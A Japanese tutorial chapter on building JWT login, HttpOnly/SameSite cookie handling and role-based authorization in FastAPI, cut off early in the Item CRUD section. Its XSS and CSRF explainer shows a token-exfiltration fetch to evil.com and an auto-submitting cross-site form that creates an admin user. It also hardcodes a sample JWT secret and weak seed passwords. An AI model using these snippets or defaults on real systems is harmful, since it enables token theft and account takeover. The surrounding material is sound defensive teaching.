# Chapter 6: 認証・認可(自前 ID/PW)

[<- 目次に戻る](../README.md)

## この章のゴール

- **JWT (JSON Web Token)** の仕組みを理解し、ログイン API でトークンを発行する
- トークンを **HttpOnly Cookie** でブラウザに渡し、XSS 耐性のある認証を実装する
- **`Depends(get_current_user)`** で認証ガードをかけ、未ログインユーザーのアクセスを拒否する
- **ロールベースの認可** を実装し、ロールに応じてアクセスできる API を制限する
- **Item の CRUD** を「認証されたユーザーが自分の Item を管理する」形で実装する

## スタート地点

```bash
# 前章 (Chapter 5) の完成状態から始めます
git checkout chapter05-end
```

## 完成形

```bash
git checkout chapter06-end
```

---

## はじめに

Chapter 5 では User の CRUD API を実装しましたが、**誰でも全操作できる** 状態のままでした。実際の Web アプリでは：

- **認証 (Authentication)**: 「あなたは誰ですか？」を確認する仕組み(ログイン)
- **認可 (Authorization)**: 「あなたはこの操作をする権限がありますか？」を確認する仕組み(ロールチェック)

の両方が必要です。この章では自前で ID/PW 認証 + JWT トークン + ロールベース認可を実装し、Chapter 5 の API に被せていきます。

### 認証フロー(概要)

```mermaid
sequenceDiagram
    participant C as クライアント(ブラウザ)
    participant S as サーバー (FastAPI)

    Note over C,S: ログイン
    C->>S: POST /api/v1/login (username + password)
    S->>S: パスワード検証 -> JWT を生成
    S-->>C: Set-Cookie: access_token=<JWT>; HttpOnly; SameSite=Lax

    Note over C,S: 以降のリクエスト
    C->>S: リクエスト (ブラウザが自動で Cookie を付与)
    S->>S: Cookie から JWT を取り出し -> 署名検証 -> ユーザー特定 -> 認可チェック
    S-->>C: レスポンス
```

---

## 1. 環境変数の読み込みとアプリ起動

```bash
cd $PROJECT_DIR

# db -> migrate(マイグレーション+シード) -> backend の順で起動する
docker compose down && docker compose up -d --build
```

---

## 2. JWT (JSON Web Token) とは

JWT は「**署名付きの JSON データ**」をコンパクトにエンコードしたトークン形式です。

### 構造

JWT は `.` (ドット) で 3 パートに分かれています：

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ5YW1hZGEiLCJleHAiOjE3MTcwMDAwMDB9.XXXXXXXXXXXXXXX
|----- Header -----|.|----------------- Payload ----------------|.|- Signature -|
```

| パート | 内容 |
|---|---|
| **Header** | アルゴリズム情報(`{"alg": "HS256", "typ": "JWT"}`)を Base64URL エンコードしたもの |
| **Payload** | トークンに含めたい情報(`sub`: ユーザー名, `exp`: 有効期限 など)を Base64URL エンコードしたもの |
| **Signature** | `Header + "." + Payload` を **秘密鍵で署名** したもの。改ざん検知に使う |

### なぜ JWT を使うのか

- **ステートレス**: サーバー側でセッションを保持しなくて良い(トークン自体に情報が含まれる)
- **署名で改ざん検知**: Payload を書き換えても署名が合わなくなるので、サーバーは「このトークンは自分が発行した正当なものか」を秘密鍵だけで検証できる
- **有効期限 (`exp`)**: トークンが自動で失効する

> [!WARNING] JWT の Payload は暗号化されていない  
> Base64URL エンコードは **誰でもデコードできます**(暗号化ではない)。そのためパスワードなどの秘密情報を Payload に入れてはいけません。入れて良いのは「ユーザー名」「有効期限」「ロール」のような、漏れても直接被害がない情報だけです。

---

## 3. config.py に JWT 関連の設定を追加

`backend/app/config.py` に JWT 関連の環境変数を追加します。

```python
# backend/app/config.py
from pydantic_settings import BaseSettings


class Environment(BaseSettings):
    """環境変数から読み込まれる設定オブジェクト"""

    # DB 接続情報
    db_user: str
    db_password: str
    db_host: str
    db_port: str
    db_name: str

    # JWT 設定
    token_secret_key: str = "change-me-in-production"
    token_algorithm: str = "HS256"
    token_expire_minutes: int = 480  # 8 時間

    # Cookie 設定
    cookie_secure: bool = False  # 本番は True (HTTPS 必須)

    @property
    def database_url(self) -> str:
        """SQLAlchemy 用の接続 URL を組み立てる"""
        return f"postgresql+psycopg://{self.db_user}:{self.db_password}@{self.db_host}:{self.db_port}/{self.db_name}"


env = Environment()  # type: ignore[call-arg]
```

### .env に追加

`backend/.env.sample` に JWT 関連の環境変数を追記します：

```bash
# backend/.env.sample (追記分)

# JWT 設定
TOKEN_SECRET_KEY=09d25e094faa6ca2556c818166b7a9563b93f7099f6f0f4caa6cf63b88e8d3e7
TOKEN_ALGORITHM=HS256
TOKEN_EXPIRE_MINUTES=480

# Cookie 設定 (開発: false, 本番: true)
COOKIE_SECURE=false
```

`.env` を再作成(テンプレートをコピー)：

```bash
cd $PROJECT_DIR
cp $PROJECT_DIR/backend/.env.sample $PROJECT_DIR/backend/.env
```

> [!WARNING] `TOKEN_SECRET_KEY` は本番では絶対に変更する  
> 秘密鍵が漏洩すると、誰でも有効なトークンを偽造できてしまいます。本番用の鍵は `openssl rand -hex 32` で生成し、環境変数で安全に渡してください。

---

## 4. PyJWT をインストール

```bash
cd $PROJECT_DIR/backend
uv add 'PyJWT~=2.12.1'
```

アプリの再起動

```bash
cd $PROJECT_DIR

# db -> migrate(マイグレーション+シード) -> backend の順で起動する
docker compose down && docker compose up -d --build
```


---

## 5. auth.py に JWT 発行・検証を追加

Chapter 5 で作った `auth.py` を拡張します。

```python
# backend/app/auth.py
"""認証関連のユーティリティ。"""
from datetime import datetime, timedelta, timezone

import jwt
from fastapi import Depends, HTTPException, Request, status
from pwdlib import PasswordHash
from sqlalchemy import select
from sqlalchemy.orm import Session

from app.config import env
from app.model import User
from app.session import get_session


# --- パスワードハッシュ ---

_password_hash = PasswordHash.recommended()


def hash_password(plain_password: str) -> str:
    """平文パスワードを Argon2 でハッシュ化する"""
    return _password_hash.hash(plain_password)


def verify_password(plain_password: str, hashed_password: str) -> bool:
    """平文パスワードがハッシュと一致するかを検証する"""
    return _password_hash.verify(plain_password, hashed_password)


# --- JWT ---

# ペイロードに sub (ユーザー名) と exp (有効期限) を入れて署名する
def create_access_token(username: str) -> str:
    """JWT アクセストークンを生成する"""
    expire = datetime.now(timezone.utc) + timedelta(minutes=env.token_expire_minutes)
    payload = {
        "sub": username,  # subject: トークンの主体(ユーザー名)
        "exp": expire,    # expiration: 有効期限
    }
    return jwt.encode(payload, env.token_secret_key, algorithm=env.token_algorithm)


# 署名検証 + 有効期限チェック。 ExpiredSignatureError と InvalidTokenError を分けて処理
def decode_access_token(token: str) -> dict:
    """JWT を検証・デコードする。無効なら例外を投げる"""
    try:
        return jwt.decode(token, env.token_secret_key, algorithms=[env.token_algorithm])
    except jwt.ExpiredSignatureError:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Token has expired",
        )
    except jwt.InvalidTokenError:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid token",
        )


# --- 認証ガード ---

def get_current_user(
    request: Request,
    session: Session = Depends(get_session),
) -> User:
    """リクエストからトークンを取り出し、ユーザーを返す。

    トークンの取得元:
      1. Cookie の "access_token" (ブラウザ用)
      2. Authorization ヘッダの "Bearer <token>" (API クライアント用)
    """
    # 1. Cookie から取得を試みる
    token = request.cookies.get("access_token")

    # 2. Cookie が無ければ Authorization ヘッダから取得
    if token is None:
        auth_header = request.headers.get("Authorization")
        if auth_header and auth_header.startswith("Bearer "):
            token = auth_header.removeprefix("Bearer ")

    if token is None:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Not authenticated",
        )

    # トークンを検証してユーザーを取得
    payload = decode_access_token(token)
    username: str | None = payload.get("sub")
    if username is None:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid token payload",
        )

    user = session.execute(
        select(User).where(User.username == username)
    ).scalar_one_or_none()
    if user is None:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="User not found",
        )
    return user
```

---

## 6. シードスクリプトの拡張(動作確認用ユーザー)

ログイン API を試すには **DB にユーザーが存在する** 必要があります。Chapter 4 の `seed.py` に動作確認用ユーザーの作成を追加しましょう。

`backend/app/seed.py` に `seed_users()` 関数を追加し、`main()` から呼びます：

```python
# backend/app/seed.py (追記)
from app.model import Role, RoleType, User
from app import auth


def seed_users() -> None:
    """動作確認用ユーザーを投入する。すでに存在すればスキップ。"""
    test_users = [
        {"username": "sys_admin", "password": "admin", "role": RoleType.SYSTEM_ADMIN},
        {"username": "loc_admin", "password": "admin", "role": RoleType.LOCATION_ADMIN},
        {"username": "loc_operator", "password": "operator", "role": RoleType.LOCATION_OPERATOR},
    ]
    with SessionLocal() as session:
        for u in test_users:
            existing = session.execute(
                select(User).where(User.username == u["username"])
            ).scalar_one_or_none()
            if existing is not None:
                print(f"  skipped (already exists): {u['username']}")
                continue
            role = session.execute(
                select(Role).where(Role.name == u["role"])
            ).scalar_one_or_none()
            if role is None:
                print(f"  skipped (role not found): {u['role']}")
                continue
            user = User(
                username=u["username"],
                hashed_password=auth.hash_password(u["password"]),
                roles=[role],
            )
            session.add(user)
            print(f"  inserted: {u['username']} ({u['role'].value})")
        session.commit()


def main() -> None:
    print("Seeding roles...")
    seed_roles()
    print("Seeding users...")
    seed_users()
    print("Done.")
```

シードを実行して動作確認用ユーザーを作成：

```bash
cd $PROJECT_DIR/backend
uv run python -m app.seed
# Seeding roles...
#   skipped (already exists): SYSTEM_ADMIN
#   ...
# Seeding users...
#   inserted: sys_admin (SYSTEM_ADMIN)
#   inserted: loc_admin (LOCATION_ADMIN)
#   inserted: loc_operator (LOCATION_OPERATOR)
# Done.
```

| ユーザー名 | パスワード | ロール | 用途 |
|---|---|---|---|
| `sys_admin` | `admin` | SYSTEM_ADMIN | 全操作可能な管理者 |
| `loc_admin` | `admin` | LOCATION_ADMIN | ユーザー閲覧・更新 + Item 全操作 |
| `loc_operator` | `operator` | LOCATION_OPERATOR | Item の操作のみ |

---

## 7. ログイン API の実装

`backend/app/routers.py` にログイン API を追加します。

```python
# backend/app/routers.py (冒頭の import に追加)
from fastapi import APIRouter, Depends, HTTPException, Response, status  # Responseを追加
from app.config import env
from app.schemas import UserLogin  # UserLogin を追加
```

`backend/app/schemas.py` にログインリクエストのスキーマを追加します。

```python
# backend/app/schemas.py (末尾に追加)

class UserLogin(BaseModel):
    """POST /api/v1/login のリクエストボディ"""
    username: str
    password: str
```

```python
# backend/app/routers.py (末尾に追加)

@router.post("/login")
def login(
    response: Response,
    data: UserLogin,
    session: Session = Depends(get_session),
):
    """ユーザー名とパスワードでログインし、JWT トークンを発行する"""
    user = session.execute(
        select(User).where(User.username == data.username)
    ).scalar_one_or_none()

    if user is None or not auth.verify_password(data.password, user.hashed_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect username or password",
        )

    # JWT を生成
    token = auth.create_access_token(user.username)

    # Cookie にトークンをセット (ブラウザ用)。 
    response.set_cookie(
        key="access_token",
        value=token,
        httponly=True,       # JS の document.cookie からアクセス不可 (XSS 対策)
        samesite="lax",      # 異なるサイトからの POST では Cookie を送らない (CSRF 対策)
        secure=env.cookie_secure,  # 開発環境(HTTP)では False、 本番(HTTPS)では True
        max_age=env.token_expire_minutes * 60,  # Cookie 有効期限 (秒)。 JWT 自体の exp と揃える
    )

    # レスポンスボディでもトークンを返す。 (Authorization: Bearer で送りたい場面があるため)
    return {"access_token": token, "token_type": "bearer"}


@router.post("/logout")
def logout(response: Response):
    """Cookie を削除してログアウトする"""
    response.delete_cookie(key="access_token")
    return {"detail": "Logged out"}


@router.get("/me", response_model=UserRead)
def read_me(
    # Depends(auth.get_current_user) : 認証済みユーザーを取得し、 UserRead 形式で返す。
    current_user: User = Depends(auth.get_current_user),
) -> User:
    """ログイン中のユーザー自身の情報を返す"""
    return current_user
```

> [!NOTE] HttpOnly Cookie とは？  
> Cookie に `HttpOnly` フラグを付けると、ブラウザの JavaScript (`document.cookie`) から **一切読み取れなく** なります。これにより、仮に XSS(悪意ある JS がページに注入される攻撃)が発生しても、トークンを盗まれるリスクを排除できます。
>
> ブラウザは Cookie を **自動的にリクエストに含める** ので、JS からトークンにアクセスする必要は本来ありません。

> [!NOTE] SameSite=Lax とは？  
> Cookie の `SameSite` 属性を `Lax` に設定すると、**異なるサイトから発行された POST リクエスト** には Cookie が含まれなくなります。これにより、外部サイトに仕込まれたフォームからの CSRF 攻撃を防げます。
>
> GET リクエスト(トップレベルナビゲーション)では Cookie が送られますが、REST API 設計では GET は読み取り操作のみなので問題ありません。

### 動作確認

`-i` フラグを付けて**レスポンスヘッダも含めて表示** し、`Set-Cookie` が意図通りになっているか確認します。

```bash
curl -i -X POST "http://backend:8000/api/v1/login" \
  -H 'Content-Type: application/json' \
  -d '{"username": "sys_admin", "password": "admin"}'
# HTTP/1.1 200 OK
# ...
# set-cookie: access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; HttpOnly; Path=/; SameSite=lax
# ...
#
# {"access_token":"eyJ...","token_type":"bearer"}
```

確認すべきポイント：
- **`set-cookie:` ヘッダが存在する** -> Cookie がブラウザに渡される
- **`HttpOnly`** が付いている -> JS からアクセス不可
- **`SameSite=lax`** が付いている -> 別サイトからの POST で Cookie が送られない
- レスポンスボディにも `access_token` が含まれる -> curl / API クライアント用

---

## 8. Web アプリのセキュリティ: Cookie / XSS / CSRF / CORS

ログイン API を実装したところで、**`Set-Cookie` の各属性がセキュリティ的にどのような役割を果たすのか**、そしてそれが**どの攻撃を防ぐのか** を整理しておきます。

> 参考: [HTTP Cookie セキュリティ | MDN](https://developer.mozilla.org/ja/docs/Web/HTTP/Guides/Cookies#%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3)

### 8.1 Cookie のセキュリティ属性

セクション 6 の `response.set_cookie(...)` で設定した各属性の役割を整理します。

```
Set-Cookie: access_token=eyJ...; HttpOnly; SameSite=Lax; Secure
```

| 属性 | 値 | 役割 | 防ぐ攻撃 |
|---|---|---|---|
| **`Secure`** | (フラグ) | **HTTPS 通信のときだけ** Cookie を送信します。HTTP (平文) では送りません | **通信経路上の盗聴** (中間者攻撃) |
| **`HttpOnly`** | (フラグ) | **JavaScript (`document.cookie`) から Cookie にアクセスできなくする** | **XSS によるトークン盗難** |
| **`SameSite`** | `Lax` | **別サイトからの POST(フォーム) / fetch / xhr / サブリソース読み込みで Cookie を送りません** | **CSRF (クロスサイトリクエストフォージェリ)** |

#### Secure

通信が暗号化されていない HTTP (平文) のネットワークでは、Cookie がそのまま流れるため **盗聴するだけでトークンを奪取** できます。`Secure` フラグを付けると **HTTPS のリクエストでのみ Cookie が送られる** ので、平文経路での漏洩を防ぎます。

開発環境 (`http://localhost`) では HTTPS を使わないので `Secure=false` にしていますが、**本番では必ず `true` にしてください**。

#### HttpOnly

JavaScript の `document.cookie` から Cookie を **一切読み取れなくする** フラグです。ブラウザは Cookie を **リクエストに自動で付与する** ので、JS から読む必要は本来ありません。このフラグにより「XSS で悪意ある JS が注入されても、トークンを盗めない」状態を作ります。

#### SameSite=Lax

「**別のサイトから発行されたリクエスト** に Cookie を付けるかどうか」を制御する属性です。

| リクエストの種類 | 具体例 | Cookie が送られるか |
|---|---|---|
| **同じサイト** からのリクエスト(任意メソッド) | 自サイト内の fetch、フォーム送信、リンク | ✅ 送られる |
| **別サイト** からの **トップレベル GET ナビゲーション** | `<a href="...">` クリック、アドレスバー直接入力 | ✅ 送られる |
| **別サイト** からの **フォーム POST** | `<form method="POST" action="...">...</form>` | ❌ **送られない** |
| **別サイト** からの **fetch / XHR**(任意メソッド) | `fetch("...", { method: "POST" })` | ❌ **送られない** |
| **別サイト** からの **サブリソース読み込み** | `<img src="...">`, `<script src="...">` | ❌ **送られない** |

これにより、悪意あるサイトからフォーム送信や fetch で API を叩こうとしても **Cookie が付与されないため認証されない** -> CSRF が防げます。

> [!NOTE] SameSite の他の選択肢
> - `SameSite=Strict`: 別サイトからの **あらゆるリクエスト** で Cookie を送らない。最も安全ですが、外部リンクからサイトに遷移したときにログアウト状態に見えてしまいます(UX が悪い)
> - `SameSite=None`: 従来の動作(どこからでも送る)。`Secure` 必須。サードパーティ Cookie が必要な場面(広告、SSO など)のみ使う

以降のセクションでは、各属性が **具体的にどの攻撃を防ぐのか** を詳しく解説します。

---

### 8.2 XSS (Cross-Site Scripting)

#### XSS とは

XSS は「**悪意ある JavaScript がページに注入されて実行される**」攻撃です。例えば：

- 掲示板の投稿に `<script>` タグが含まれていて、閲覧した他のユーザーのブラウザで JS が動く
- URL のクエリパラメータがエスケープされずにページに埋め込まれ、JS として実行される

XSS が成立すると、攻撃者の JS は **そのページのコンテキストで何でもできる** 状態になります。`document.cookie` でトークンを読み取って外部サーバーに送信する、API を勝手に叩く、画面を改ざんするなど。

**localStorage にトークンを保存する場合のリスク**

```javascript
// よくあるが危険なパターン
localStorage.setItem("token", response.access_token);

// XSS で攻撃者が実行する JS:
fetch("https://evil.com/steal?token=" + localStorage.getItem("token"));
```

`localStorage` は **どの JS からでも読める** ので、XSS 一発でトークンが盗まれます。

#### HttpOnly が XSS からトークンを守る

7.1 で説明した通り、`HttpOnly` フラグが付いた Cookie は JS からアクセスできません。XSS が発生しても：

- ❌ `document.cookie` -> アクセス不可(HttpOnly)
- ❌ `localStorage.getItem("token")` -> そもそも保存していない
- ✅ ブラウザは Cookie を **自動でリクエストに付与する** ので、正規のユーザー操作には影響なし

つまり **「トークンを盗む」という攻撃パスを根本的に潰す** のが HttpOnly の役割です。

> [!WARNING] XSS 自体を防ぐことも重要  
> HttpOnly はトークン盗難を防ぎますが、XSS そのものは防ぎません。XSS が成立すると「トークンを盗めなくても、攻撃者の JS がユーザーに代わって API を叩く(同一オリジンのリクエストには Cookie が付くため)」ことは可能です。
>
> XSS 対策の本筋は **入力のサニタイズ**(ユーザー入力を HTML に埋め込むときにエスケープする)と **Content-Security-Policy ヘッダ** の設定です。Cookie の HttpOnly は「万が一 XSS が突破されたときの保険」という位置付けです。

### 8.3 CSRF (Cross-Site Request Forgery)

#### CSRF とは

CSRF は「**悪意あるサイトが、ユーザーのブラウザを経由して、ログイン済みの別サイトにリクエストを送る**」攻撃です。

1. ユーザーが https://myapp.example.com にログイン中(Cookie がセット済み)
2. ユーザーが悪意あるサイト evil.com にアクセス
3. evil.com のページに以下の HTML が埋め込まれている:
    ```html
    <form action="https://myapp.example.com/api/v1/users/" method="POST">
      <input type="hidden" name="username" value="evil_admin" />
      ...
    </form>
    <script>document.forms[0].submit();</script>
    ```
4. ブラウザが myapp.example.com に POST を送信 -> Cookie が自動付与される
5. サーバーは「ログイン済みユーザーからの正規リクエスト」と認識してしまいます

#### SameSite=Lax が CSRF を防ぐ

7.1 で説明した通り、`SameSite=Lax` を設定すると **別サイトからの POST / fetch では Cookie が送られません**。

上の CSRF シナリオでは evil.com からのフォーム POST なので **Cookie が付与されず、認証されず、攻撃は失敗** します。

> [!NOTE] GET で状態変更しない REST 設計が前提  
> `SameSite=Lax` は「外部サイトからの GET リンククリック(トップレベルナビゲーション)」では Cookie を送ります。これは「外部サイトからリンクで遷移したときにログイン状態が維持される」UX のためです。
>
> REST API 設計で「GET は読み取りのみ、状態変更は POST/PATCH/DELETE」を守っていれば、外部サイトからの GET は安全です(読み取りしか行われないので)。Chapter 5 で設計した API はこの原則を守っています。

### 8.4 CORS (Cross-Origin Resource Sharing)

#### 同一オリジンポリシー

ブラウザには「**同一オリジンポリシー**」というセキュリティ制約があります。これは **異なるオリジン(ドメイン + ポート + スキーム)への fetch/XHR リクエストをデフォルトで拒否する** 仕組みです。

| リクエスト元 | リクエスト先 | 同一オリジンか |
|---|---|---|
| `http://localhost:3000` (Next.js) | `http://localhost:3000/api/...` | ✅ 同一 |
| `http://localhost:3000` (Next.js) | `http://localhost:8000/api/...` (FastAPI) | ❌ **異なる**(ポートが違う) |
| `https://myapp.example.com` | `https://api.example.com` | ❌ **異なる**(サブドメインが違う) |

オリジンが違うと、サーバーに到達してもブラウザがレスポンスを読めません。本教材では **Chapter 10 で前段に置くリバースプロキシ(nginx)で frontend と backend を同一オリジンに揃える**ため、この制約には引っかからず **CORS 設定は不要**です。ただし CORS は Web 開発で頻出の重要概念なので、仕組みを押さえておきましょう。

#### CORS とは

**CORS はサーバー側が「このオリジンからのリクエストを許可する」と宣言する仕組み** です。サーバーがレスポンスに以下のヘッダを付けることで、ブラウザに「このレスポンスは読んで良い」と伝えます。

- [Access-Control-Allow-Origin | MDN](https://developer.mozilla.org/ja/docs/Web/HTTP/Reference/Headers/Access-Control-Allow-Origin)  
`Access-Control-Allow-Origin: http://localhost:3000`
- [Access-Control-Allow-Credentials | MDN](https://developer.mozilla.org/ja/docs/Web/HTTP/Reference/Headers/Access-Control-Allow-Credentials)  
`Access-Control-Allow-Credentials: true`
- [Access-Control-Allow-Methods | MDN](https://developer.mozilla.org/ja/docs/Web/HTTP/Reference/Headers/Access-Control-Allow-Methods)  
`Access-Control-Allow-Methods: GET, POST, PATCH, DELETE, OPTIONS`
- [Access-Control-Allow-Headers | MDN](https://developer.mozilla.org/ja/docs/Web/HTTP/Reference/Headers/Access-Control-Allow-Headers)  
`Access-Control-Allow-Headers: Content-Type, Authorization`


#### 異なるオリジンにCookie を送るための追加条件

- [Request: credentialsプロパティ | MDN](https://developer.mozilla.org/ja/docs/Web/API/Request/credentials)

異なるオリジンへのリクエストで **Cookie を含めるには** クライアント側とサーバー側の両方で設定が必要です：

| 側 | 必要な設定 |
|---|---|
| **クライアント (JS)** | `fetch(..., { credentials: "include" })` |
| **サーバー** | `Access-Control-Allow-Credentials: true` + `Access-Control-Allow-Origin` に **具体的なオリジン**(`*` は不可) |

※ `Allow-Origin: *` と `Allow-Credentials: true` は **併用できません**(セキュリティ上の理由で、ブラウザが拒否する)。必ず `http://localhost:3000` のように具体的に指定する必要があります。



---

## 9. Chapter 5 の User CRUD に認証を被せる

`routers.py` の既存エンドポイントに `Depends(auth.get_current_user)` を追加します。

```python
# backend/app/routers.py (修正例: create_user)

@router.post("/users/", response_model=UserRead, status_code=status.HTTP_201_CREATED)
def create_user(
    data: UserCreate,
    session: Session = Depends(get_session),
    _: User = Depends(auth.get_current_user),  # <- 追加
) -> User:
    # ... 既存の実装はそのまま ...


@router.get("/users/{user_id}", response_model=UserRead)
def read_user(
    user_id: int,
    session: Session = Depends(get_session),
    _: User = Depends(auth.get_current_user),  # <- 追加
) -> User:
    # ... 既存の実装はそのまま ...

@router.get("/users/", response_model=list[UserRead])
def read_users(
    skip: int = 0,
    limit: int = 100,
    session: Session = Depends(get_session),
    _: User = Depends(auth.get_current_user),  # <- 追加
) -> list[User]:
    # ... 既存の実装はそのまま ...

@router.patch("/users/{user_id}", response_model=UserRead)
def update_user(
    user_id: int,
    data: "UserUpdate",
    session: Session = Depends(get_session),
    _: User = Depends(auth.get_current_user),  # <- 追加
) -> User:
    # ... 既存の実装はそのまま ...

@router.delete("/users/{user_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_user(
    user_id: int,
    session: Session = Depends(get_session),
    _: User = Depends(auth.get_current_user),  # <- 追加
) -> None:
    # ... 既存の実装はそのまま ...
```

全エンドポイントに同様に `current_user: User = Depends(auth.get_current_user)` を追加してください。使わない場合は `_: User = Depends(auth.get_current_user)` でも OK です。

### 動作確認

```bash
# 認証なしでアクセスすると 401
curl -s "http://backend:8000/api/v1/users/" | jq .
# {"detail": "Not authenticated"}

# Authorization ヘッダ付きでアクセス
TOKEN=$(curl -s -X POST "http://backend:8000/api/v1/login" \
  -H 'Content-Type: application/json' \
  -d '{"username": "sys_admin", "password": "admin"}' | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" "http://backend:8000/api/v1/users/" | jq .
# [{"id": 1, "username": "sys_admin", ...}]
```

---

## 10. ロールベースの認可

「認証済み」だけでなく、「**特定のロールを持つユーザーだけがアクセスできる**」エンドポイントを作ります。

### 10.1 権限の定義

`backend/app/permissions.py` を新規作成します。

```bash
touch $PROJECT_DIR/backend/app/permissions.py
```

```python
# backend/app/permissions.py
"""ロールベースの認可。"""
import enum
from typing import Callable

from fastapi import Depends, HTTPException, status

from app import auth
from app.model import RoleType, User


class PermissionType(str, enum.Enum):
    """操作の種類"""
    USER_CREATE = "USER_CREATE"
    USER_READ = "USER_READ"
    USER_UPDATE = "USER_UPDATE"
    USER_DELETE = "USER_DELETE"
    ITEM_CREATE = "ITEM_CREATE"
    ITEM_READ = "ITEM_READ"
    ITEM_UPDATE = "ITEM_UPDATE"
    ITEM_DELETE = "ITEM_DELETE"


# ロールごとに保有する権限を定義
ROLE_PERMISSIONS: dict[RoleType, set[PermissionType]] = {
    RoleType.SYSTEM_ADMIN: {
        PermissionType.USER_CREATE,
        PermissionType.USER_READ,
        PermissionType.USER_UPDATE,
        PermissionType.USER_DELETE,
        PermissionType.ITEM_CREATE,
        PermissionType.ITEM_READ,
        PermissionType.ITEM_UPDATE,
        PermissionType.ITEM_DELETE,
    },
    RoleType.LOCATION_ADMIN: {
        PermissionType.USER_READ,
        PermissionType.USER_UPDATE,
        PermissionType.ITEM_CREATE,
        PermissionType.ITEM_READ,
        PermissionType.ITEM_UPDATE,
        PermissionType.ITEM_DELETE,
    },
    RoleType.LOCATION_OPERATOR: {
        PermissionType.ITEM_CREATE,
        PermissionType.ITEM_READ,
        PermissionType.ITEM_UPDATE,
        PermissionType.ITEM_DELETE,
    },
}


def has_role(user: User, role: RoleType) -> bool:
    """ユーザーが指定されたロールを持っているかを確認する"""
    return role in [r.name for r in user.roles]


# ユーザーの全ロールの権限を合算し、 要求された権限を「すべて」保有しているかを確認
def has_permission(user: User, required: list[PermissionType]) -> bool:
    """ユーザーが指定された権限をすべて保有しているかを確認する"""
    user_permissions: set[PermissionType] = set()
    for role in user.roles:
        user_permissions |= ROLE_PERMISSIONS.get(role.name, set())
    return set(required).issubset(user_permissions)


# 「依存関数を動的に生成する」パターン。 Depends(require_permissions([...])) のように使う
def require_permissions(permissions: list[PermissionType]) -> Callable:
    """指定された権限を持たないユーザーには 403 を返す依存関数を生成する"""

    def _check(current_user: User = Depends(auth.get_current_user)) -> User:
        if not has_permission(current_user, permissions):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Permission denied",
            )
        return current_user

    return _check


# 所有権チェックが必要な全エンドポイントからこのヘルパーを呼ぶことで、 ロジックを 1 箇所に集約する。
# allow_admin=True がデフォルトなので、 SYSTEM_ADMIN は所有者チェックをスキップして全アクセス可になる
def check_resource_ownership(
    *,
    owner_id: int,
    current_user: User,
    allow_admin: bool = True,
) -> None:
    """リソースの所有者であることを確認する。

    - owner_id: リソースの所有者のユーザー ID
    - current_user: 現在ログイン中のユーザー
    - allow_admin: True の場合、SYSTEM_ADMIN は所有者チェックをスキップ
    """
    if allow_admin and has_role(current_user, RoleType.SYSTEM_ADMIN):
        return
    if owner_id != current_user.id:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Permission denied",
        )
```

> [!NOTE] ポイント解説:
> - **認可の 2 つのレイヤー**  
>   本教材の認可は 2 層に分かれています：
>   1. **ロールベースの操作権限** (`require_permissions`): 「`ITEM_UPDATE` などの操作タイプを実行する権限がロールに含まれているか」  
>     エンドポイントの `Depends` で宣言的にチェック。 (エンドポイントのロジックと切り離せる)
>   2. **リソースベースの所有権** (`check_resource_ownership`): 「このリソース(item)は自分のものか」  
>     エンドポイント内でリソースを取得した後にチェック  

### 10.2 ルーターで認可を適用

`routers.py` の `Depends(auth.get_current_user)` を `Depends(require_permissions([...]))` に差し替えます。

```python
# backend/app/routers.py (import に追加)
from app.permissions import PermissionType, require_permissions

# ユーザー作成
@router.post("/users/", response_model=UserRead, status_code=status.HTTP_201_CREATED)
def create_user(
    data: UserCreate,
    session: Session = Depends(get_session),
    _: User = Depends(require_permissions([PermissionType.USER_CREATE])),
) -> User:
    # ...

# ユーザー取得
@router.get("/users/{user_id}", response_model=UserRead)
def read_user(
    user_id: int,
    session: Session = Depends(get_session),
    _: User = Depends(require_permissions([PermissionType.USER_READ])),
) -> User:
    # ...

# ユーザー一覧
@router.get("/users/", response_model=list[UserRead])
def read_users(
    skip: int = 0,
    limit: int = 100,
    session: Session = Depends(get_session),
    _: User = Depends(require_permissions([PermissionType.USER_READ])),
) -> list[User]:
    # ...

# ユーザー更新
@router.patch("/users/{user_id}", response_model=UserRead)
def update_user(
    user_id: int,
    data: UserUpdate,
    session: Session = Depends(get_session),
    _: User = Depends(require_permissions([PermissionType.USER_UPDATE])),
) -> User:
    # ...

# ユーザー削除
@router.delete("/users/{user_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_user(
    user_id: int,
    session: Session = Depends(get_session),
    _: User = Depends(require_permissions([PermissionType.USER_DELETE])),
) -> None:
    # ...
```

### 動作確認

```bash
# LOCATION_OPERATOR でログイン (USER_CREATE 権限なし)
TOKEN=$(curl -s -X POST "http://backend:8000/api/v1/login" \
  -H 'Content-Type: application/json' \
  -d '{"username": "loc_operator", "password": "operator"}' | jq -r .access_token)

# ユーザー作成を試みると 403
curl -s -X POST "http://backend:8000/api/v1/users/" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username": "test", "password": "test", "role_ids": [3]}' | jq .

# {"detail": "Permission denied"}
```

---

## 11. Item CRUD の実装

### 11.1 スキーマを追加

`backend/app/schemas.py` に Item 用スキーマを追加します。

```python
# backend/app/schemas.py (追記)

# ===== Item =====

class ItemCreate(BaseModel):
    """POST /api/v1/items/ のリクエストボディ"""
    title: str
    content: str


class ItemUpdate(BaseModel):
    """PATCH /api/v1/items/{item_id} のリクエストボディ"""
    title: str | None = None
    content: str | None = None


class ItemRead(BaseModel):
    """GET レスポンスとして返す Item"""
    id: int
    user_id: int
    title: str
    content: str

    model_config = ConfigDict(from_attributes=True)
```

### 11.2 Item エンドポイントを実装

`backend/app/routers.py` に Item の CRUD を追加します。

```python
# backend/app/routers.py (import に追加)
from app.model import Role, RoleType, User, Item  # <- RoleType, Item を追加
